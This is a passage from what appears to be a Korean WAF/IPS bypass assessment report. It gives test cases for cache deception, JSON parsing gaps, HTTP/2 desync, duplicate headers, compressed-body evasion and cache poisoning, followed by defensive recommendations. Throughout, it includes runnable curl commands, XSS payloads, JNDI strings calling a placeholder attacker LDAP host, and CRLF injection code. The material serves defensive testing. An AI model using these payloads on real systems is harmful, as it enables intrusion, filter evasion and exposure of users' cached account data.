# 인증된 상태에서 동적 페이지에 정적 확장자 추가
curl -b "session=VALID_SESSION" \
  https://target.example.com/my-account/profile.css

# path delimiter 차이 악용 (세미콜론)
curl -b "session=VALID_SESSION" \
  "https://target.example.com/my-account;x.css"

# 인코딩된 구분자
curl -b "session=VALID_SESSION" \
  "https://target.example.com/my-account%2F..%2Fstatic/style.css"

# 이후 인증 없이 동일 URL 접근 → 캐시된 동적 응답 확인
curl https://target.example.com/my-account/profile.css
```

**자동화 도구 (WCD Testing Tool)**:

```bash
# 6개 확장자(.css, .jpg, .png, .txt, .html, .ico) × 8개 delimiter(; @ , ! ~ % # ?) 자동 테스트
python3 cache_deception_test.py \
  --url "https://target.example.com/my-account" \
  --cookie "session=VALID_SESSION"

# 테스트 흐름:
# 1. 인증된 상태로 base_url + 확장자/delimiter 요청
# 2. Cache-Control 헤더에서 "public" 또는 "max-age" 확인
# 3. 응답 본문에서 username, email, token, session 등 민감 키워드 탐색
# 4. 동일 URL을 쿠키 없이 재요청하여 Cross-user 노출 확인
```

**도구의 테스트 URL 패턴**:

```
# 확장자 테스트
https://target.example.com/my-account.css
https://target.example.com/my-account.jpg
https://target.example.com/my-account.ico

# Delimiter 테스트
https://target.example.com/my-account;cache
https://target.example.com/my-account@cache
https://target.example.com/my-account!cache
https://target.example.com/my-account~cache
```

**판정 기준**:
- 인증 없이 접근한 URL에서 인증된 사용자의 개인정보·토큰이 포함된 응답이 반환되면 → Web Cache Deception 취약
- 응답 헤더에 `X-Cache: HIT`, `CF-Cache-Status: HIT`, 또는 `Age:` 값이 존재하면 → 캐시 적중 확인

---

### **TC-15. JSON Partial Parse / Fallback / Lax Parsing 확인**

**대상 공백**: 검사 범위 공백 / JSON 검사 파이프라인 공백  
**목적**: WAF의 JSON 파싱이 실패할 때 fallback 동작이 어떻게 설정되어 있는지 확인

**테스트 요청**:

```bash
# 기준선: 정상 JSON (탐지 예상)
curl -X POST https://target.example.com/api/data \
  -H "Content-Type: application/json" \
  -d '{"q":"<script>alert(1)</script>"}'

# Invalid JSON (의도적 구문 오류 삽입 후 페이로드 배치)
curl -X POST https://target.example.com/api/data \
  -H "Content-Type: application/json" \
  -d '{"valid":"value",,,"q":"<script>alert(1)</script>"}'

# JSON 내 trailing comma + 페이로드
curl -X POST https://target.example.com/api/data \
  -H "Content-Type: application/json" \
  -d '{"a":"b","q":"<script>alert(1)</script>",}'

# 중첩 깊이를 극단적으로 높여 파서 한계 유도
python3 -c "
depth = 500
payload = '{\"a\":' * depth + '\"<script>alert(1)</script>\"' + '}' * depth
print(payload)
" | curl -X POST https://target.example.com/api/data \
    -H "Content-Type: application/json" \
    --data-binary @-

# JSON 내 주석 삽입 (비표준이지만 일부 파서가 허용)
curl -X POST https://target.example.com/api/data \
  -H "Content-Type: application/json" \
  -d '{"q":/* comment */"<script>alert(1)</script>"}'

# Duplicate key 충돌
curl -X POST https://target.example.com/api/data \
  -H "Content-Type: application/json" \
  -d '{"q":"safe","q":"<script>alert(1)</script>"}'
```

**판정 기준**:
- 정상 JSON에서만 탐지되고 invalid JSON에서 통과하면 → JSON fallback 정책이 NO_MATCH로 설정됨
- 파서 한계(중첩 깊이) 초과 시 탐지 실패하면 → 검사 범위 공백 확인
- 서버가 관대한 파서(trailing comma, 주석 허용)를 사용하여 페이로드가 실행되면 → 파서 불일치
- duplicate key에서 WAF와 앱이 서로 다른 값을 채택하면 → JSON duplicate key ambiguity 확인

---

### **TC-16. HTTP/2 다운그레이드를 통한 데싱크**

**대상 공백**: 프로토콜 경계 공백  
**목적**: HTTP/2 프런트엔드가 HTTP/1.1 백엔드로 다운그레이드할 때 발생하는 파싱 차이 확인

**테스트 방법**:

```bash
# HTTP/2로 연결하되 HTTP/1.1 전용 헤더 삽입
curl --http2 https://target.example.com/ \
  -H "Transfer-Encoding: chunked"

# HTTP/2 pseudo-header와 Host 헤더 불일치
curl --http2 https://target.example.com/ \
  -H ":authority: target.example.com" \
  -H "Host: evil.example.com"

# HTTP/2 CRLF injection 시도 (헤더 값에 \r\n 삽입)
python3 -c "
import socket, ssl, h2.connection, h2.config, h2.events

config = h2.config.H2Configuration(client_side=True)
conn = h2.connection.H2Connection(config=config)
conn.initiate_connection()

# 헤더에 CRLF 삽입 시도
headers = [
    (':method', 'GET'),
    (':path', '/'),
    (':scheme', 'https'),
    (':authority', 'target.example.com'),
    ('x-custom', 'value\r\nTransfer-Encoding: chunked'),
]
conn.send_headers(1, headers)
# ... socket 전송 로직
"
```

**Burp Suite 기반 테스트**:

```
# Burp Suite → HTTP Request Smuggler 확장 사용
# 대상 URL에 대해 H2.CL, H2.TE, H2.0 desync 자동 스캔
# Inspector에서 HTTP/2 raw 헤더 직접 편집하여 수동 검증
```

**판정 기준**:
- HTTP/2 요청이 HTTP/1.1로 변환되는 과정에서 헤더가 재해석되면 → 다운그레이드 데싱크 가능성
- `Transfer-Encoding: chunked`가 HTTP/2에서 무시되나 다운그레이드 후 적용되면 → HRS 가능

---

### **TC-17. Duplicate Header / Canonicalization Conflict**

**대상 공백**: 의미 재해석 공백 / canonicalization 불일치  
**목적**: edge, proxy, origin이 중복 헤더와 표기 변형을 같은 값으로 해석하는지 확인

**테스트 요청**:

```http
GET / HTTP/1.1
Host: safe.example.com
Host: admin.example.com
Connection: close
```

```http
POST /api HTTP/1.1
Host: target.example.com
Content-Type: application/json
Content-Type: text/plain

{"q":"${jndi:ldap://attacker/a}"}
```

**판정 기준**:
- WAF 판단 기준 헤더와 origin 최종 채택 헤더가 다르면 → canonicalization conflict
- `Transfer-Encoding`/`Transfer Encoding`/`Transfer_Encoding`처럼 표기 변형에 따라 결과가 달라지면 → strict parsing 미흡

### **TC-18. Compressed Body Inspection (gzip/deflate/br)**

**대상 공백**: 검사 범위 공백 / content decoding 공백  
**목적**: 압축된 body를 복원한 뒤 검사하는지 확인

**테스트 요청**:

```bash
python3 - <<'PY'
import gzip, sys
body=b'{"q":"${jndi:ldap://attacker/a}"}'
sys.stdout.buffer.write(gzip.compress(body))
PY | curl -X POST https://target.example.com/api/data \
  -H "Content-Type: application/json" \
  -H "Content-Encoding: gzip" \
  --data-binary @-
```

**실증 결과 (Service-B, 2026-03-12)**:
| 조건 | 비압축 | gzip | deflate |
| :---- | :---- | :---- | :---- |
| 정상 body | 302 | 302 | - |
| JNDI body | timeout (차단) | 302 (통과) | 302 (통과) |

→ IPS가 `Content-Encoding`을 해제하지 않고 raw 매칭만 수행. 압축 body 우회 **확인**.

**IPS/WAF 벤더별 decompression 설정**:
| 벤더 | 설정 항목 |
| :---- | :---- |
| Snort | `http_inspect` → `decompress_gzip true`, `decompress_deflate true` |
| Suricata | `suricata.yaml` → `app-layer.protocols.http.decompression.enabled: yes` |
| Palo Alto | Threat Prevention profile → Inspect Compressed Content |
| Fortinet | WAF/IPS profile → Decompress Content |

**판정 기준**:
- 평문은 차단되나 압축 body는 통과하면 → 복원 후 검사 미흡
- 복원 후 크기가 oversize가 되는 경우 정책이 달라지면 → decoding 후 scope 정책 불일치

### **TC-19. Authority / Host / Forwarded Mismatch**

**대상 공백**: 의미 재해석 공백 / routing authority mismatch  
**목적**: Host, `:authority`, forwarded 계열 헤더 불일치 시 어떤 값이 실제 라우팅에 사용되는지 확인

**테스트 요청**:

```bash
curl --http2 https://target.example.com/ \
  -H "Host: target.example.com" \
  -H "X-Forwarded-Host: admin.internal.example.com"
```

**판정 기준**:
- 보안 판단 기준과 origin 라우팅 기준이 다르면 → ACL/cache key 불일치 위험
- `X-Forwarded-Proto`, `X-Forwarded-Port` 조합에 따라 절대 URL/redirect가 달라지면 → proxy trust 경계 재검토

### **TC-20. Cache Key Poisoning / Unkeyed Input**

**대상 공백**: 중간 계층-후단 정규화 공백 / cache key 불일치  
**목적**: cache deception이 아니라 poisoning과 unkeyed input을 확인

**테스트 요청**:

```bash
curl -I "https://target.example.com/account?utm_source=a"
curl -I "https://target.example.com/account?utm_source=b"
curl -H "X-Forwarded-Host: attacker.example" https://target.example.com/account
```

**판정 기준**:
- cache key에 반영되지 않는 입력이 다른 사용자의 응답에 남으면 → cache poisoning / unkeyed input
- `Age`, `X-Cache`, `CF-Cache-Status`가 적중을 보이는데 응답 내용이 오염되면 → 공개 캐시 위험

### **TC-21. Cookie Duplicate / Oversize Inspection**

**대상 공백**: 검사 범위 공백 / cookie 해석 불일치  
**목적**: duplicate cookie와 긴 cookie chain에 대한 해석 차이를 확인

**테스트 요청**:

```http
Cookie: role=user; role=admin
```

```http
Cookie: session=AAA...AAA; pad=BBBB...BBBB; exploit=${jndi:ldap://attacker/a}
```

**판정 기준**:
- WAF는 첫 번째 cookie를, 앱은 마지막 cookie를 채택하면 → duplicate cookie ambiguity
- 긴 cookie chain에서 inspection truncation이 발생하면 → cookie scope gap

### **TC-22. JSON Duplicate Key Ambiguity**

**대상 공백**: JSON 검사 파이프라인 공백 / 의미 재해석 공백  
**목적**: duplicate key 처리 차이로 인한 우회를 확인

**테스트 요청**:

```json
{"role":"user","role":"admin"}
```

```json
{"q":"safe","q":"${jndi:ldap://attacker/a}"}
```

**판정 기준**:
- WAF는 첫 번째 값을, 앱은 마지막 값을 채택하면 → duplicate key ambiguity
- 앱이 에러 없이 수용하는데 보안 장비가 정상 JSON로만 판단하면 → parser parity 미흡

### **TC-23. Charset / BOM / UTF-16 Parsing Gap**

**대상 공백**: 검사 모드 선택 공백 / normalization 공백  
**목적**: charset/BOM에 따라 raw bytes와 앱 복원 의미가 달라지는지 확인

**테스트 요청**:

- `Content-Type: application/json; charset=utf-16le`
- UTF-16LE + BOM JSON에 `${...}` 또는 `<script>` 삽입
- UTF-8 baseline과 UTF-16 variant 비교

**판정 기준**:
- raw bytes 기준 검사와 앱 복원 후 의미가 다르면 → charset parsing gap
- BOM 유무에 따라 탐지/차단 결과가 달라지면 → parser branch 불일치

### **TC-24. Chunk Extension / Trailer Header Parsing**

**대상 공백**: 프로토콜 경계 공백 / parser discrepancy  
**목적**: chunk extension과 trailer header가 검사 경로에서 누락되는지 확인

**테스트 요청**:

```http
Transfer-Encoding: chunked

4;foo=bar
test
0
X-Ignore: a
```

**판정 기준**:
- WAF는 chunk extension/trailer를 무시하고 backend만 처리하면 → parser discrepancy
- trailer가 security-relevant metadata처럼 동작하면 → 후단 해석 불일치

### **TC-25. HTTP/3 Visibility Parity**

**대상 공백**: 암복호화/프로토콜 가시성 공백  
**목적**: HTTP/3와 H1/H2 간 정책·가시성 parity를 확인

**실행 조건**: 대상이 실제로 H3를 지원하는 경우에만 수행

**판정 기준**:
- H3 요청만 응답 fingerprint, 헤더 canonicalization, 가시성 체인이 다르면 → protocol parity gap
- 본 TC는 취약점 입증보다 coverage 확인을 우선한다.

### **TC-26. WebSocket Upgrade / Post-Handshake Blind Spot**

**대상 공백**: 검사 범위 공백 / protocol-aware inspection 부족  
**목적**: websocket handshake와 post-handshake frame 가시성 차이를 확인

**실행 조건**: `/ws`, `/socket`, subscription, SSE 같은 실시간 엔드포인트가 확인된 경우에만 수행

**판정 기준**:
- handshake만 검사되고 frame payload가 blind spot이면 → post-handshake blind spot
- query/header 기준 판단과 실제 frame 처리 결과가 다르면 → upgrade path parity 미흡

---

## **7. 종합 의견**

분석 결과, 보안 장비의 탐지 실패는 단순한 룰(Rule)의 부족보다는 **WAF–프록시–캐시–앱 프레임워크 간 해석 불일치**라는 구조적 원인에 기인한다. 2025년 최신 연구(WAFFLED 1,207개 고유 우회, PortSwigger HTTP/2 데싱크, CVE-2025-32094 Expect 데싱크)에서 확인되듯, 기존의 시그니처 기반 탐지만으로는 방어가 불가능한 영역이 확대되고 있다.

향후 탐지 체계는 다음 **열한 가지 방향**으로 고도화되어야 하며, 실무 우선순위에 따라 정렬한다.

1. **프로토콜 경계 통제 (최우선)**: HRS/desync는 인증·ACL 우회로 즉시 연결된다. HTTP/2 end-to-end 적용, 데싱크 스캐너(HTTP Request Smuggler) 정례 운용, 0.CL·Expect 헤더 변형에 대한 엄격한 차단이 필수적이다.

2. **의미 재해석 차단**: `X-Original-URL`, `X-HTTP-Method-Override`, `x-middleware-subrequest` 등 외부에서 들어온 override 헤더를 edge에서 무조건 제거하고, 라우팅 결정 이후 보안 룰을 재평가해야 한다. Path normalization bypass와 하나의 통제군으로 관리한다.

3. **검사 범위 확보**: Body/Header/Cookie oversize 처리를 MATCH(차단) 또는 별도 로깅으로 설정하고, JSON partial parse fallback 정책을 명시적으로 구성해야 한다. 대용량 업로드 API·멀티파트·긴 JSON 배열을 사용하는 서비스에서 우선 점검한다. **Content-Encoding(gzip/deflate) 복원 후 검사가 활성화되어 있는지 반드시 확인해야 한다** — 실증 테스트에서 IPS가 압축된 body를 복원하지 않고 raw 바이트 매칭만 수행하여 공격 구문이 통과하는 것이 확인되었다(섹션 4-3 발견 1).

4. **검사 모드 선택 통제**: Content-Type 비정상(제거, 변형, 다중 선언) 시 보수적으로 차단/격리하고, parser failure 시 기본 동작을 MATCH로 설정한다. RFC 준수 프록시(HTTP-Normalizer)를 통해 비표준 요청을 정규화한 후 검사한다. 멀티파트, JSON, XML처럼 파서 분기가 다른 요청은 parser branch 선택 실패 자체를 탐지 이벤트로 남겨야 한다.

5. **정규화 후 검사 (Normalize-then-Inspect)**: 모든 입력값에 대해 백엔드와 동일한 수준의 정규화 및 디코딩을 선행한 후 검사해야 한다. URL Encoding, JSON Unicode Escape, Double Encoding, Overlong UTF-8, 유니코드 시각적 유사 문자(NFC/NFKC), 헥스 인코딩 등 모든 변형을 해소한 뒤 시그니처를 매칭한다.

6. **TLS 가시성 운영 고도화**: SSL Mirror/복호화 장비는 Tier-0 운영 대상으로 관리해야 한다. 인증서 수명주기 자동화, fail-open/fail-closed 정책, 복호화 coverage SLO, canary test, 복호화 후 body/header parity 검증이 필요하다. "장비가 있다"가 아니라 "실제 중요 트래픽이 검사된다"가 기준이어야 한다.

7. **센서 가용성·건전성 관리**: IDS/IPS의 메모리, 패킷 드롭, 재조합 한계, 프로세스 재시작은 곧 탐지 공백이다. 센서 health SLO, 드롭률 알림, HA/failover, 복호화 실패율 모니터링, flow log/endpoint telemetry 보강이 필요하다. 가능하면 로컬 비교 랩(예: Suricata inline drop)으로 `진짜 drop 증상`과 `front proxy 403`를 구분하는 기준을 유지해야 한다.

8. **WAF 룰의 역할 재정의**: WAF/IPS 룰은 패치 전 단기 완화에는 유효하지만, parser discrepancy·TLS blind spot·edge-origin 불일치 같은 구조적 문제의 영구 대책은 아니다. 공개 사고 사례에서 보듯, 인터넷 노출 핵심 자산은 "룰 추가"보다 "패치/격리/가시성 확보"를 우선해야 한다. 동시에 `403 응답 = 장비 차단`처럼 응답 코드만으로 통제를 과신하는 운영 관행도 교정해야 한다.

9. **Canonicalization / Cache Key 일치성 검증**: duplicate header·cookie·JSON key, `Host`/`:authority`/`Forwarded`, cache key에 반영되지 않는 입력은 모두 같은 통제군으로 관리해야 한다. edge와 origin이 서로 다른 값을 채택하면 보안 판단은 무의미해진다.

10. **Positive Security 도입**: 반복적으로 parser discrepancy가 나오는 API는 OpenAPI/Swagger 기반 스키마 검증, unknown field 차단, type mismatch 차단, additionalProperties 제한 같은 Positive Security를 적용하는 편이 룰 추가보다 효과적이다.

11. **OOB / 확장 프로토콜 판정 보수화**: callback 미수신은 DNS sinkhole, proxy, egress filtering과 함께 해석해야 하며, HTTP/3·WebSocket·GraphQL·gRPC 같은 프로토콜은 사용 정황이 있을 때 protocol-aware inspection 여부를 따로 점검해야 한다.

---

#### **참고 자료**

1. The ultimate Bug Bounty guide to HTTP request smuggling vulnerabilities \- YesWeHack, 3월 10, 2026에 액세스, [https://www.yeswehack.com/learn-bug-bounty/http-request-smuggling-guide-vulnerabilities](https://www.yeswehack.com/learn-bug-bounty/http-request-smuggling-guide-vulnerabilities)
2. HTTP/1.1 must die: the desync endgame | PortSwigger Research, 3월 10, 2026에 액세스, [https://portswigger.net/research/http1-must-die](https://portswigger.net/research/http1-must-die)
3. CVE-2025-3454: Grafana Auth Bypass Vulnerability \- SentinelOne, 3월 10, 2026에 액세스, [https://www.sentinelone.com/vulnerability-database/cve-2025-3454/](https://www.sentinelone.com/vulnerability-database/cve-2025-3454/)
4. Path Normalization Bypass in Traefik Router \+ Middleware Rules \- GitHub Advisory, 3월 10, 2026에 액세스, [https://github.com/traefik/traefik/security/advisories/GHSA-gm3x-23wp-hc2c](https://github.com/traefik/traefik/security/advisories/GHSA-gm3x-23wp-hc2c)
5. WAFFLED: Exploiting Parsing Discrepancies to Bypass Web Application Firewalls \- arXiv, 3월 10, 2026에 액세스, [https://arxiv.org/html/2503.10846v3](https://arxiv.org/html/2503.10846v3)
6. Web Application Firewall (WAF) Bypass Techniques that Work in 2025 \- Medium, 3월 10, 2026에 액세스, [https://medium.com/infosecmatrix/web-application-firewall-waf-bypass-techniques-that-work-in-2025-b11861b2767b](https://medium.com/infosecmatrix/web-application-firewall-waf-bypass-techniques-that-work-in-2025-b11861b2767b)
7. NowSecure Uncovers Multiple Security and Privacy Flaws in DeepSeek iOS Mobile App, 3월 10, 2026에 액세스, [https://www.nowsecure.com/blog/2025/02/06/nowsecure-uncovers-multiple-security-and-privacy-flaws-in-deepseek-ios-mobile-app/](https://www.nowsecure.com/blog/2025/02/06/nowsecure-uncovers-multiple-security-and-privacy-flaws-in-deepseek-ios-mobile-app/)
8. CVE-2025-32094 (Akamai/Netlify Expect 기반 데싱크), 3월 10, 2026에 액세스
9. CVE-2025-7783 (ASP.NET HPP JSON/배열 확장), 3월 10, 2026에 액세스
10. Oversize web request components in AWS WAF \- AWS Documentation, 3월 10, 2026에 액세스, [https://docs.aws.amazon.com/waf/latest/developerguide/waf-oversize-request-components.html](https://docs.aws.amazon.com/waf/latest/developerguide/waf-oversize-request-components.html)
11. JsonBody \- AWS WAFV2 API Reference, 3월 10, 2026에 액세스, [https://docs.aws.amazon.com/waf/latest/APIReference/API_JsonBody.html](https://docs.aws.amazon.com/waf/latest/APIReference/API_JsonBody.html)
12. Test HTTP Methods \- OWASP WSTG, 3월 10, 2026에 액세스, [https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods)
13. Google ESPv2 X-HTTP-Method-Override JWT bypass, 3월 10, 2026에 액세스
14. Web Cache Deception \- PortSwigger Web Security Academy, 3월 10, 2026에 액세스, [https://portswigger.net/web-security/web-cache-deception](https://portswigger.net/web-security/web-cache-deception)
15. Ryan Barnett & Angel Hacker, Unicode-based WAF Bypass (2025), 3월 10, 2026에 액세스
16. IDS/IPS 탐지 룰 목록 (내부 참고 자료)
